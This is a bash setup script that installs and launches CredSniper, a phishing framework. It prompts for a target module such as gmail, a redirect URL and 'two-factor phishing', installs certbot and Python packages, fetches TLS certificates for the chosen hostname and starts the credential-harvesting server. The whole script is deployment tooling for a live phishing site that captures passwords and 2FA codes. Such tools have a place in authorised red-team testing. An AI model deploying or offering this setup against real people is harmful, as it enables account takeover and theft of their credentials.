#!/bin/bash
use_ssl=""
host_name=""
use_twofactor=""
module=""
port=""
final=""
ssl=""
twofactor=""

read -r -p "Module to deploy (ex: gmail)? " module

if [[ -z "$module" ]] ; then
    # Exits if no module selected
    echo "No module selected, exiting..."
    exit
fi

read -r -p "Final redirect URL: " final

if [[ -z "$final" ]] ; then
    # Exits if no final destination URL is set
    echo "No final destination URL set, exiting..."
    exit
fi

read -r -p "Enable SSL? [Y/n] " use_ssl
read -r -p "Enable two-factor phishing? [Y/n] " use_twofactor
read -r -p "Enter hostname for certificates (ex: app.example.com): " host_name
read -r -p "Port to listen on (default: 80/443)? " port

if [[ -z "$use_ssl" ]] ; then
    # Sets default answer for SSL to 'Yes'
    use_ssl='Y'
    ssl='--ssl'
fi

case "$use_ssl" in
    # Sets SSL flag for credsniper
    [yY][eE][sS]|[yY])
        ssl='--ssl'
        ;;
    *)
        ;;
esac

if [[ -z "$host_name" ]] ; then
    # Sets default answer for hostname to the local hostname
    host_name=$(hostname)
fi

if [[ -z "$use_twofactor" ]] ; then
    # Sets default answer for 2FA to 'Yes'
    use_twofactor='Y'
    twofactor='--twofactor'
fi

case "$use_twofactor" in
    [yY][eE][sS]|[yY])
        twofactor='--twofactor'
        ;;
    *)
        ;;
esac

if [[ -z "$port" ]] ; then
    # Sets default answer for port to 80 or 443
    case "$use_twofactor" in
        [yY][eE][sS]|[yY])
            port=443
            ;;
        [nN][oO]|[nN])
            port=80
            ;;
        *)
            ;;
    esac
fi

echo ""
echo "[*] Preparing environment..."
echo "[*] SSL Enabled: $use_ssl"
echo "[*] Hostname: $host_name"
echo "[*] Two-factor: $use_twofactor"
echo "[*] Loading Module: $module"
echo "[*] Port: $port"
echo "[*] Destination URL: $final"
echo "[*] Starting credsniper w/ flags: $ssl $twofactor --verbose"

echo "[*] Adding Let's Encypt repository..."
sudo add-apt-repository ppa:certbot/certbot -y;

echo "[*] Updating Apt..."
sudo apt-get -qq update;

echo "[*] Installing pre-reqs..."
sudo apt-get -qq --assume-yes install python3 virtualenv gnupg certbot;

echo "[*] Creating & activating virtual environment..."
if [ ! -f ./bin/python ]; then
    /usr/bin/virtualenv -qq -p python3 .
fi

echo "[*] Enabling port binding for Python..."
python_path=$(readlink -f ./bin/python)
sudo setcap CAP_NET_BIND_SERVICE=+eip $python_path;

echo "[*] Installing required Python modules..."
source ./bin/activate; yes | pip -qq install flask mechanicalsoup pyopenssl

case "$use_twofactor" in
    [yY][eE][sS]|[yY])
        echo "[*] Creating & installing SSL certificates..."
        sudo mkdir -p ./certs
        sudo certbot certonly --standalone --preferred-challenges http -d $host_name
        sudo cp /etc/letsencrypt/live/$host_name/privkey.pem certs/$host_name.privkey.pem
        sudo cp /etc/letsencrypt/live/$host_name/cert.pem certs/$host_name.cert.pem
        export owner=$(ls -ld . | awk '{print $3}')
        sudo chown -R $owner:$owner ./certs/
        ;;
    *)
        ;;
esac

echo "[*] ###################################################"
echo "[*] Successfully installed everything!"
echo "[*] To run manually just:"
echo "[*]     ~/CredSniper$ source bin/activate"
echo "[*]     (CredSniper) ~/CredSniper$ python credsniper.py"
echo "[*] ###################################################"

echo "[*] Launching CredSniper..."
source ./bin/activate;python credsniper.py --module $module $ssl $twofactor --verbose --final $final --hostname $host_name

wait
